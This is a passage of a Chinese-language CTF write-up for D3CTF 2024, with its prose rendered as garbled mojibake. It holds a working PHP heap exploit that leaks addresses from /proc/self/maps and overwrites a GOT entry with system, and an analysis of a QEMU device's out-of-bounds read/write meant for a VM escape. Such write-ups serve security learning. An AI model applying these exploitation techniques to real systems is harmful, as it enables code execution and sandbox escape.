invoke__">strlen</span>(<span class="variable">$str</span>) - <span class="number">1</span>;<span class="variable">$i</span> &gt;= <span class="number">0</span>;<span class="variable">$i</span>--) <span class="variable">$hex</span>.= <span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]));</span><br><span class="line">    <span class="variable">$hex</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$hex</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$hex</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">int2Str</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$x</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;C&#x27;</span>, <span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$libc</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system_addr</span> = <span class="number">0x4c490</span>;</span><br><span class="line"><span class="variable">$efree_got</span> = <span class="number">0x4038</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;a&quot;</span>, <span class="number">0x40</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;b&quot;</span>, <span class="number">0x3f</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="number">0xe</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$n</span> = <span class="number">0x61</span> + <span class="variable">$i</span>;</span><br><span class="line">    <span class="variable">$aa</span> = <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>, <span class="variable">$n</span>);</span><br><span class="line">    <span class="variable">$aaa</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="variable">$aa</span>, <span class="number">0x40</span>);</span><br><span class="line">    <span class="title function_ invoke__">addHacker</span>(<span class="variable">$aaa</span>, <span class="variable">$b</span>);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;/readflag &gt; /var/www/html/flag.txt\x00&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">editHacker</span>(<span class="number">0</span>,<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">7</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;c&quot;</span>, <span class="number">0x40</span>);</span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$a</span>, <span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">6</span>);</span><br><span class="line"><span class="title function_ invoke__">editHacker</span>(<span class="number">8</span>, <span class="title function_ invoke__">int2str</span>(<span class="variable">$mod_base</span>+<span class="variable">$efree_got</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$a</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">int2str</span>(<span class="variable">$libc_base</span>+<span class="variable">$system_addr</span>),<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$payload</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>è¿™é“é¢˜æˆ‘æ„Ÿè§‰éš¾ç‚¹åœ¨äºå¦‚ä½•è°ƒè¯•ã€‚è¿™é“é¢˜ç›®ç»™å‡ºäº† <code>docker</code> ç¯å¢ƒï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ <code>docker</code> ä¸­å¯åŠ¨ <code>gdbserver</code> è¿œç¨‹è°ƒè¯•ï¼Œå…¶åšæ³•å¦‚ä¸‹ï¼š  </p><img src="/2024/04/29/d3ctf2024/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç„¶ååœ¨å¦å¤–ä¸€ä¸ªç»ˆç«¯ä¸­å¯åŠ¨ <code>gdb</code>ï¼Œç„¶åè¾“å…¥ <code>target remote:8888</code> å³å¯è¿æ¥<br>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ <code>docker</code> æ˜¯å°†å…¶ <code>9999</code> ç«¯å£æ˜ å°„åˆ°ç‰©ç†æœºçš„ <code>8888</code> ç«¯å£ï¼Œæ‰€ä»¥æˆ‘åœ¨ <code>docker</code> ä¸­å¯åŠ¨ <code>gdbserver</code> ä½¿ç”¨çš„æ˜¯ <code>9999</code> ç«¯å£ï¼Œåœ¨ç‰©ç†æœºä¸­ <code>gdb</code> è¿œç¨‹è¿æ¥çš„ç«¯å£æ˜¯ <code>8888</code><br>ç”±äºé¢˜ç›®ç»™çš„ <code>docker</code> å¹¶æ²¡æœ‰å®‰è£… <code>gdbserver</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢è¿™æ¡å‘½ä»¤è¿›è¡Œå®‰è£…  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install gdbserver</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±è¦è¯´è¯´è°ƒè¯•æŠ€å·§ã€‚ç”±äºç¨‹åºè¦è¿è¡Œå¾ˆå¤šæ±‡ç¼–ä»£ç åæ‰ä¼šå°† <code>vuln.so</code> æ¨¡å—ç»™åŠ è½½è¿›æ¥ï¼Œæ‰€ä»¥ä¸€ç›´åœ¨ <code>gdb</code> ä¸­ä½¿ç”¨ <code>si</code> æ˜¯è¡Œä¸é€šçš„ï¼Œæˆ‘çš„æ–¹æ³•æ˜¯åœ¨ <code>exp.php</code> ä¸­ä½¿ç”¨ <code>fgetc(STDIN)</code> æ¥å°†ç¨‹åºå¡ä½ï¼Œç„¶ååœ¨ <code>gdb</code> ä¸­è¾“å…¥ <code>c</code> æ¥è¿›è¡Œç±»ä¼¼äºæ–­ç‚¹çš„æ“ä½œï¼Œä½†æ˜¯è¿™æ ·çš„ <code>php</code> æ–‡ä»¶è¿è¡Œæ—¶ä¼šå‘ç°ç³»ç»ŸæŠ¥é”™è¯´æ‰¾ä¸åˆ° <code>fgetc</code> è¿™ä¸€ä¸ª <code>function</code>ï¼Œè¿™æ˜¯åº”ä¸ºåœ¨ <code>php.ini</code> æ–‡ä»¶ä¸­å°†è¿™ä¸€ä¸ªå‡½æ•°ç»™ <code>ban</code> äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢è¿™ä¸€æ¡æŒ‡ä»¤æ¥æ‰¾åˆ° <code>php.ini</code> æ–‡ä»¶æ‰€åœ¨çš„æ–‡ä»¶å¤¹  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -i | grep <span class="string">&quot;Configuration File (php.ini) Path&quot;</span></span><br></pre></td></tr></table></figure><p>åœ¨ <code>php.ini</code> æ–‡ä»¶ä¸­æˆ‘ä»¬æ‰¾åˆ° <code>disable_functions</code> é‚£ä¸ªåœ°æ–¹  </p><img src="/2024/04/29/d3ctf2024/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§æˆ‘ä»¬è¦ç”¨çš„ <code>fgetc</code> å‡½æ•°åœ¨æœ€åä¸€è¡Œï¼Œæˆ‘ä»¬å°†å…¶åˆ é™¤å³å¯<br>ä¸‹é¢ç»™å‡ºä¸€æ¡ç”¨äºæŸ¥è¯¢ <code>php</code> æ‰©å±•æ¨¡å—æ‰€åœ¨çš„è·¯å¾„çš„å‘½ä»¤  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php-config --extension-dir</span><br></pre></td></tr></table></figure><h2 id="D3EasyEscape"><a href="#D3EasyEscape" class="headerlink" title="D3EasyEscape"></a>D3EasyEscape</h2><p>è¿™é“é¢˜æ˜¯ <code>qemu</code> é€ƒé€¸ï¼Œä¹‹å‰æ²¡äº‹å¹²å­¦äº†ä¸€ä¸‹ï¼Œè¿™ä¸åˆšå¥½å¯ä»¥ç”¨ä¸Šäº†ï¼Œå…¶å…³é”®å‡½æ•°å¦‚ä¸‹ï¼š<br>l0dev_mmio_readï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">l0dev_mmio_read</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">82LL</span>, <span class="string">&quot;l0dev_mmio_read&quot;</span>);</span><br><span class="line">  dest = <span class="number">-1LL</span>;</span><br><span class="line">  addr_v7 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8</span> * addr_v7 + size &lt;= <span class="number">0x100</span> )</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;dest, (<span class="type">const</span> <span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v6 + <span class="number">0xA00</span>) + addr) + <span class="number">0xC30</span>LL + v6 + <span class="number">4</span>), size);</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>l0dev_pmio_readï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">l0dev_pmio_read</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">104LL</span>, <span class="string">&quot;l0dev_pmio_read&quot;</span>);</span><br><span class="line">  dest = <span class="number">-1LL</span>;</span><br><span class="line">  addr_v7 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8</span> * addr_v7 + size &gt; <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dest, (<span class="type">const</span> <span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)addr + <span class="number">0xC30</span>LL + v6 + <span class="number">4</span>), size);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)dest == <span class="number">666</span> )</span><br><span class="line">    ++dword_123B1CC;</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>l0dev_mmio_writeï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">l0dev_mmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, __int64 value, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size_n; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  _QWORD n_4[<span class="number">3</span>]; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> addr_v7; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  n_4[<span class="number">2</span>] = opaque;</span><br><span class="line">  n_4[<span class="number">1</span>] = addr;</span><br><span class="line">  n_4[<span class="number">0</span>] = value;</span><br><span class="line">  size_n = size;</span><br><span class="line">  v8 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">133LL</span>, <span class="string">&quot;l0dev_mmio_write&quot;</span>);</span><br><span class="line">  v9 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  result = (<span class="type">void</span> *)addr;</span><br><span class="line">  addr_v7 = addr;</span><br><span class="line">  <span class="keyword">if</span> ( size_n &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">void</span> *)(<span class="number">8</span> * v9 + size_n);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr_v7 == <span class="number">0x40</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = n_4[<span class="number">0</span>];</span><br><span class="line">        addr_v7 = (*(<span class="type">int</span> (__fastcall **)(_QWORD *))(v8 + <span class="number">0xD48</span>))(n_4) % <span class="number">0x100</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)(addr_v7 + <span class="number">0xC30</span>LL + v8 + <span class="number">4</span>), n_4, size_n);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr_v7 == <span class="number">0x80</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="type">void</span> *)n_4[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> ( n_4[<span class="number">0</span>] &lt;= <span class="number">0x100</span>uLL )</span><br><span class="line">        &#123;</span><br><span class="line">          result = (<span class="type">void</span> *)v8;</span><br><span class="line">          *(_DWORD *)(v8 + <span class="number">0xA00</span>) = n_4[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)(addr_v7 + <span class="number">0xC30</span>LL + v8 + <span class="number">4</span>), n_4, size_n);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>l0dev_pmio_writeï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">l0dev_pmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, __int64 value, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  _DWORD n[<span class="number">3</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v6; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = opaque;</span><br><span class="line">  addr_v6 = addr;</span><br><span class="line">  *(_QWORD *)&amp;n[<span class="number">1</span>] = value;</span><br><span class="line">  n[<span class="number">0</span>] = size;</span><br><span class="line">  v9 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">173LL</span>, <span class="string">&quot;l0dev_pmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_123B1CC )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v9 + <span class="number">0xA00</span>) + addr_v6) + <span class="number">0xC30</span>LL + v9 + <span class="number">4</span>), &amp;n[<span class="number">1</span>], n[<span class="number">0</span>]);</span><br><span class="line">  result = (<span class="type">void</span> *)(addr_v6 &gt;&gt; <span class="number">3</span>);</span><br><span class="line">  addr_v10 = addr_v6 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( n[<span class="number">0</span>] &lt;= <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">void</span> *)(<span class="number">8</span> * addr_v10 + n[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = addr_v6;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)addr_v6 + <span class="number">0xC30</span>LL + v9 + <span class="number">4</span>), &amp;n[<span class="number">1</span>], n[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯´å®è¯ï¼Œè¿™é“é¢˜ç›®æˆ‘çœ‹äº†å¥½ä¹…æ‰æ‰¾åˆ°æ¼æ´ï¼Œè¿˜æ˜¯åšé¢˜åšå¤ªå°‘äº†ã€‚åœ¨ <code>l0dev_mmio_write</code> å‡½æ•°ä¸­å½“ <code>addr_v7 == 0x80</code> æ—¶æˆ‘ä»¬å¯ä»¥å¯¹ <code>*(_DWORD *)(v8 + 0xA00)</code> çš„å€¼è¿›è¡Œè®¾ç½®ï¼Œè€Œåœ¨ <code>l0dev_mmio_read</code> å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥ç›¸å¯¹ <code>*(_DWORD *)(v8 + 0xA00)</code> æŸä¸ªåç§»èŒƒå›´å†…çš„æ•°æ®è¿›è¡Œè¯»ï¼Œåœ¨ <code>l0dev_pmio_write</code> å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥ç›¸å¯¹ <code>*(_DWORD *)(v8 + 0xA00)</code> æŸä¸ªåç§»èŒƒå›´å†…çš„æ•°æ®è¿›è¡Œå†™ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œå­˜åœ¨è¶Šç•Œè¯»å’Œè¶Šç•Œå†™ã€‚è§‚å¯Ÿåˆ° <code>l0dev_mmio_write</code> å‡½æ•°ä¸­ä¸‹é¢è¿™ä¸€æ®µä»£ç ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( addr_v7 == <span class="number">0x40</span> )&#123;</span><br><span class="line">    v10 = n_4[<span class="number">0</span>];</span><br><span class="line">    addr_v7 = (*(<span class="type">int</span> (__fastcall **)(_QWORD *))(v8 + <span class="number">0xD48</span>))(n_4) % <span class="number">0x100</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)(addr_v7 + <span class="number">0xC30</span>LL + v8 + <span class="number">4</span>), n_4, size_n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§ <code>(int (__fastcall **)(_QWORD *))(v8 + 0xD48)</code> å¤„å­˜å‚¨çš„æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œé€šè¿‡ <code>gdb</code> æˆ‘ä»¬å¯ä»¥å‘ç°å…¶å­˜å‚¨çš„æ˜¯ <code>rand_r</code> å‡½æ•°çš„åœ°å€ï¼Œè¯¥å‡½æ•°ä½äº <code>libc</code> ä¸Šï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è¶Šç•Œè¯»è¯»å–æ­¤å¤„æ¥è·å– <code>libc</code> çš„åœ°å€ã€‚å¯ä»¥çœ‹è§è¿™ä¸ªåœ°æ–¹æ˜¯é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨äº†å‡½æ•°ï¼Œä¸”å‡½æ•°çš„å‚æ•°æˆ‘ä»¬æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åŠ«æŒè¯¥å‡½æ•°æŒ‡é’ˆæ‰§è¡Œ <code>system</code> å‡½æ•°çš„åœ°å€ï¼Œç„¶åå¦å‡½æ•°ä»å‚æ•°ä¸º <code>sh</code> å³å¯å®ç°é€ƒé€¸<br>expï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 